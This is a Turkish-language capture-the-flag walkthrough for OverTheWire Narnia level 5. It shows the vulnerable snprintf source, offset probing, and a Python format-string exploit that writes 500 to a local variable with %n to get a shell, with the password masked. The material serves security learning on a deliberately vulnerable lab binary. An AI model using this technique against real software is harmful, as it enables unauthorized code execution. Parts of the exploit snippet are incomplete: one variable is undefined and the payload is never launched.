# OverTheWire — Narnia Level 5 → 6

> Hedef: `narnia5`'ten `narnia6` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **format string** açığı → `%n` ile local `i`'ye 500 yazma.

---

## 1. Bağlantı
```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
int i = 1;
char buffer[64];
snprintf(buffer, sizeof buffer, argv[1]);   // AÇIK: format string = argv[1] (stdin değil)
if(i == 500){ printf("GOOD\n"); system("/bin/sh"); }
printf("i = %d (%p)\n", i, &i);             // program &i'yi BASAR (hediye)
```

## 3. Zafiyet
`snprintf(buf,64,argv[1])` → format string'i biz veriyoruz. `%x` ile stack okur, `%n` ile
**stack'teki bir adrese yazarız**. Program her (çökmeyen) çalıştırmada `&i`'yi basar → adres
tahmini yok. `snprintf` 64'e kırpsa bile `%n` **tam sayacı** alır (glibc) → `%.496x` ile 500 yazılır.

## 4. Offset — probe (**VERIFIED = 1**, walkthrough'taki 5 DEĞİL!)
```bash
/narnia/narnia5 'AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x'
# buffer : [AAAA.41414141.f7fc602e.0.0.0.0.0.0] (34)
#                ^^^^^^^^ %1$x = 41414141  =>  offset = 1
```
> ⚠️ **Canlı bulgu:** Repo walkthrough'u offset **5** der; bu binary'de girdimiz **%1$**'de
> çıkıyor → offset **1**. Önce `%5$n` denedim (yanlış slot'a yazdı, `i` 1 kaldı, shell yok),
> probe ile 1'e düzelttim.

## 5. Exploit
`&i`'yi programın kendi `%p` çıktısından oku (NİHAİ payload uzunluğunda, çökmeden):
```python
import subprocess, struct, time, sys, re
# 1) leak: yazmayan, final uzunlukla aynı (4 + "%.496x%1$x")
leak = subprocess.run([b'/narnia/narnia5', b'BBBB%.496x%1$x'], capture_output=True)
iaddr = int(re.search(r'i = 1 \(0x([0-9a-f]+)\)', out).group(1), 16)   # örn ffffd3a0
# 2) exploit: 4 (adres) + %.496x = 500  ->  %1$n  ->  i = 500
payload = struct.pack('<I', iaddr) + b'%.496x%1$n'
# narnia5 env'i silmez -> PATH var -> cat çalışır; timed stdin ile komut
```
Çıktı: `... GOOD` → `uid=14006(narnia6)` → şifre.

> 💡 **Neden `%1$x` (leak) sonra `%1$n` (exploit)?** İkisi **aynı uzunlukta** (`x`/`n`), o
> yüzden `&i` her iki çağrıda aynı. Sızdırırken `%n` kullanırsan sahte adrese yazıp **segfault**
> olur ve `&i` satırını göremezsin.
> **bytes'lı argv:** Python `subprocess` POSIX'te **bytes args** kabul eder → adres baytları
> (0xff vb.) utf-8 kodlamasıyla bozulmaz.

## 6. Doğrulama
`uid=14006(narnia6)` ✅

## Dersler
| Konu | Not |
|------|-----|
| format string `%n` | `snprintf(buf,n,argv[1])` → keyfi adrese yazma |
| offset = 1 | **probe et**; walkthrough 5 demiş, gerçek 1 (binary sürümüne bağlı) |
| &i hediye | program `%p` ile basıyor → çıktıdan oku, sızdırma derdi yok |
| leak ≡ exploit uzunluk | `%1$x` vs `%1$n` aynı uzunluk → `&i` sabit |
| `snprintf` kırpsa da | `%n` tam sayacı alır → 64 buffer'a rağmen 500 yazılır |

**narnia6 şifresi: `**********`**
